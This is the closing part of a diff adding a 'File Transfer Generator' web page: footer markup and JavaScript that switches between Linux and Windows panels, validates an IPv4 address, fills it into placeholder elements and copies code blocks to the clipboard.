+    </div>
+
+    <footer>
+        <div class="container">
+            <p>File Transfer Generator &copy; 2025</p>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const ipInput = document.getElementById('ip-input');
+            const generateBtn = document.getElementById('generate-btn');
+            const ipError = document.getElementById('ip-error');
+            const osBtns = document.querySelectorAll('.os-btn');
+            const linuxContent = document.getElementById('linux-content');
+            const windowsContent = document.getElementById('windows-content');
+            
+            // OS selection
+            osBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    // Remove active class from all buttons
+                    osBtns.forEach(b => b.classList.remove('active'));
+                    // Add active class to clicked button
+                    this.classList.add('active');
+                    
+                    // Show corresponding content
+                    const os = this.getAttribute('data-os');
+                    if (os === 'linux') {
+                        linuxContent.classList.add('active');
+                        windowsContent.classList.remove('active');
+                    } else {
+                        linuxContent.classList.remove('active');
+                        windowsContent.classList.add('active');
+                    }
+                });
+            });
+            
+            // IP validation and generation
+            generateBtn.addEventListener('click', function() {
+                const ip = ipInput.value.trim();
+                
+                // Validate IP
+                if (!isValidIP(ip)) {
+                    ipError.textContent = 'Please enter a valid IP address (e.g., 192.168.1.100)';
+                    ipError.style.display = 'block';
+                    return;
+                }
+                
+                // Hide error message
+                ipError.style.display = 'none';
+                
+                // Replace all IP placeholders
+                const ipPlaceholders = document.querySelectorAll('.ip-placeholder');
+                ipPlaceholders.forEach(placeholder => {
+                    placeholder.textContent = ip;
+                });
+                
+                // Show success feedback
+                const originalText = generateBtn.textContent;
+                generateBtn.textContent = '✓ Generated!';
+                generateBtn.style.backgroundColor = 'var(--success-color)';
+                
+                setTimeout(() => {
+                    generateBtn.textContent = originalText;
+                    generateBtn.style.backgroundColor = 'var(--accent-color)';
+                }, 2000);
+            });
+            
+            // IP validation function
+            function isValidIP(ip) {
+                const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
+                if (!ipRegex.test(ip)) return false;
+                
+                const parts = ip.split('.');
+                for (let part of parts) {
+                    const num = parseInt(part, 10);
+                    if (num < 0 || num > 255) return false;
+                }
+                
+                return true;
+            }
+            
+            // Enter key support
+            ipInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    generateBtn.click();
+                }
+            });
+        });
+        
+        // Copy code function
+        function copyCode(button) {
+            const codeContainer = button.closest('.code-container');
+            const codeElement = codeContainer.querySelector('code');
+            const textArea = document.createElement('textarea');
+            textArea.value = codeElement.textContent;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+            
+            // Visual feedback
+            const originalText = button.textContent;
+            button.textContent = '✓ Copied!';
+            setTimeout(() => {
+                button.textContent = originalText;
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
